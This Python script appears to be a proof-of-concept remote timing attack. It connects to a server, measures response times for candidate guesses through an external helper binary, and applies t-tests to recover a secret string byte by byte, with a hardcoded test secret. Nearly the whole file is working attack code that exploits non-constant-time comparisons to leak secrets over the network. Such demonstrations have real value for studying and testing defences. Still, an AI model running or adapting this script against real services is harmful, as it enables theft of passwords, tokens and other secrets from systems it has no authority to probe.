from sys import argv
from socket import socket
from subprocess import PIPE, Popen
from string import printable
from time import time

from scipy.stats import ttest_ind

needle = b"this is very secret you cannot guess"

def main(host, port):
    reporter = Reporter(time())
    guesser = Guesser(
        len(needle), 100,
    )
    s = socket()
    s.connect((host, int(port)))
    while True:
        guess = guesser.next()
        duration, response = measure(s, guess.value)
        if b"ok" in response:
            print("Guessed it: {}".format(guess.value))
            break
        guess.result(duration)
        reporter.report(time())



class Reporter(object):
    def __init__(self, started):
        self.started = started
        self.measurements = 0
        self.reports = 0

    def report(self, now):
        self.measurements += 1
        elapsed = now - self.started
        if elapsed > self.reports * 10:
            self.reports += 1
            print("Took {} measurements ({}/sec)".format(
                self.measurements, self.measurements / elapsed
            ))


def measure(connection, value):
    proc = Popen(
        [b"./attack-client-measure", str(connection.fileno()), value + b"\r\n"],
        stdout=PIPE,
    )
    duration = int(proc.stdout.readline())
    response = proc.stdout.readline()
    return duration, response



def candidate(stem, ch, alphabet, length):
    filler = alphabet[0]
    return stem + ch + (filler * (length - len(stem) - 1))



def candidates_for_stem(stem, alphabet, length):
    for ch in alphabet:
        yield ch, candidate(stem, ch, alphabet, length)



def guesses_for_candidates(record, candidates):
    for ch, c in candidates:
        yield _Guess(record, ch, c)



def next_guesses(record, stem, alphabet, length):
    candidates = candidates_for_stem(stem, alphabet, length)
    for g in guesses_for_candidates(record, candidates):
        yield g



class Guesser(object):
    significance = 0.03
    minimum_mean_difference = 10.0

    def __init__(self, length, sample_count):
        # Assume we can find the length somehow.  Most people dismiss timing
        # attacks that leak the length so we suppose this is not only possible
        # but straightforward.
        self._length = length
        self.sample_count = sample_count
        self._alphabet = printable
        self._set_stem(b"")


    def _next_guesses(self):
        return next_guesses(self.record, self._stem, self._alphabet, self._length)


    def next(self):
        try:
            return next(self._guesses)
        except StopIteration:
            # We've tried all guesses for the current stem.  Now we have to
            # re-try them until we've gathered enough information to make a
            # decision.
            #
            # Whichever guess has the fewest samples gets to go next.
            k, v = min(self._candidate_samples.iteritems(), key=lambda (k, v): len(v))
            return _Guess(self.record, k, candidate(self._stem, k, self._alphabet, self._length))


    def record(self, candidate, duration):
        self._all_samples.append(duration)
        self._candidate_samples[candidate].append(duration)
        if len(self._all_samples) % (len(self._alphabet) * self.sample_count) == 0:
            # Let's re-analyse the data and see if we can draw a conclusion.
            selection = self._analyse(self._all_samples, self._candidate_samples)
            if selection is not None:
                self._set_stem(self._stem + selection)


    def _set_stem(self, stem):
        self._stem = stem
        self._all_samples = []
        self._candidate_samples = {ch: [] for ch in self._alphabet}
        self._guesses = self._next_guesses()
        print("Stem now {!r}".format(self._stem))


    def _analyse(self, all_samples, measurements):
        ttest = []
        for candidate, some_samples in measurements.iteritems():
            result = ttest_ind(some_samples, all_samples)
            ttest.append((result.pvalue, result.statistic, candidate))

        hypothesis_rejected = list(
            (pvalue, statistic, candidate)
            for (pvalue, statistic, candidate)
            in ttest
            # Any p-value less than our threshhold is a rejection of the null
            # hypothesis, which is that the samples are drawn from the sample
            # population (the server responded to the candidate in the same
            # amount of time as it required for all the other candidates).
            if pvalue < self.significance
            # Any statistic greater than zero means the server took longer to
            # respond to the candidate than it took to respond on average
            # across all candidates.  This means it did some more work - like
            # comparing the additional candidate byte. XXX Why compare against
            # value even greater than 0 here?
            and statistic > self.minimum_mean_difference
        )

        if len(hypothesis_rejected) == 1:
            [(pvalue, statistic, candidate)] = hypothesis_rejected
            print("Chose {!r} with p-value {} (differs by {}).".format(candidate, pvalue, statistic))
            return candidate
        elif len(hypothesis_rejected) > 1:
            print("Rejected hypothesis for several candidates: {!r}.".format(hypothesis_rejected))
        elif len(hypothesis_rejected) < 1:
            print(
                "Failed to reject the hypothesis at {} sample level "
                "(closest: p-value {}; difference {}; candidate: {}".format(
                    len(all_samples) / len(measurements),
                    *min(ttest)
                )
            )
        return None



class _Guess(object):
    def __init__(self, record, candidate, value):
        self._record = record
        self.candidate = candidate
        self.value = value


    def result(self, duration):
        self._record(self.candidate, duration)


main(*argv[1:])
